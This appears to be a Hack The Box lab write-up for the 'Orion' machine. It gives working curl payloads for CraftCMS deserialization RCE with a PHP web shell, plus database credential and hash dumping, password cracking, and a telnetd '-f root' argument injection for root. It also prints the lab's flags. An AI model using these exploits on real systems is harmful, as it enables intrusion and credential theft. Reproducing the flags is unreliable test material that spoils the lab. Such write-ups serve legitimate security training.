# HTB Machine Notes - Orion (Linux / Easy)

**Target IP:** `10.129.37.117`  
**Hostname:** `orion.htb`

---

## 1. Initial Foothold: CraftCMS RCE (CVE-2025-32432)

### Vulnerability Summary
CraftCMS versions (< 3.9.15, 4.14.15, 5.6.17) allow unauthenticated PHP object deserialization via the `actions/assets/generate-transform` endpoint. By poisoning the session file and then using the Yii framework's `PhpManager` class as a deserialization gadget, an attacker can include and execute the poisoned session file.

### Exploitation
1. **Session Poisoning**:
   Send a GET request to write the PHP payload into the session file:
   ```bash
   curl -i -s --resolve orion.htb:80:10.129.37.117 "http://orion.htb/index.php?p=admin/dashboard&a=%3C%3F%3D%40system%28%24_GET%5B%22cmd%22%5D%29%3Bdie%28%29%3B%3F%3E"
   ```
   * *Extract `CraftSessionId` from cookie and `CRAFT_CSRF_TOKEN` from HTML.*

2. **Triggering RCE**:
   Send a POST request to trigger the deserialization of the session file:
   ```bash
   curl -s --resolve orion.htb:80:10.129.37.117 -X POST \
     -H "Content-Type: application/json" \
     -H "X-CSRF-Token: <CSRF_TOKEN>" \
     -H "Cookie: CraftSessionId=<SESSION_ID>" \
     -d '{"assetId": 1, "handle": {"width": 123, "height": 123, "as hack": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "yii\\rbac\\PhpManager", "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_<SESSION_ID>"}]}}}' \
     "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=id"
   ```

---

## 2. Database & Credential Harvesting

* **Environment File**: Read `/var/www/html/craft/.env` using the RCE foothold.
  * **Database Credentials**: `root` : `SuperSecureCraft123Pass!` (Database: `orion`)

* **Database Dump**:
  Query the `users` table to retrieve password hashes:
  ```sql
  mysql -u root -p'SuperSecureCraft123Pass!' -e "select username, password, email from users;" orion
  ```
  * **Result**: `admin` | `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS` | `adam@orion.htb`

* **Password Cracking**:
  Bcrypt hash cracked using John the Ripper and `rockyou.txt`:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
  * **Cracked Password**: `darkangel` (reused for user `adam`)

---

## 3. SSH Access & User Flag

* **Access**: Logged in via SSH using the cracked credentials:
  ```bash
  ssh adam@10.129.37.117
  # Password: darkangel
  ```
* **User Flag**: `5212f7dd999306f4bb52df15cb469877`

---

## 4. Privilege Escalation (Root)

### Vulnerability Summary
The GNU Inetutils `telnetd` service (versions 1.9.3 to 2.7) is listening on `127.0.0.1:23` and is vulnerable to an argument injection vulnerability (**CVE-2026-24061**). Setting the `USER` environment variable to `-f root` via the Telnet negotiation options forces the system's `login` utility to skip authentication and log in directly as `root`.

### Exploitation
Run the telnet client passing the argument injection via the `-l` flag:
```bash
telnet -l "-f root" 127.0.0.1
```
* **Result**: Instant passwordless shell as `root`.

* **Root Flag**: `9af801ff84baed1f0a159a3e72233ff9`
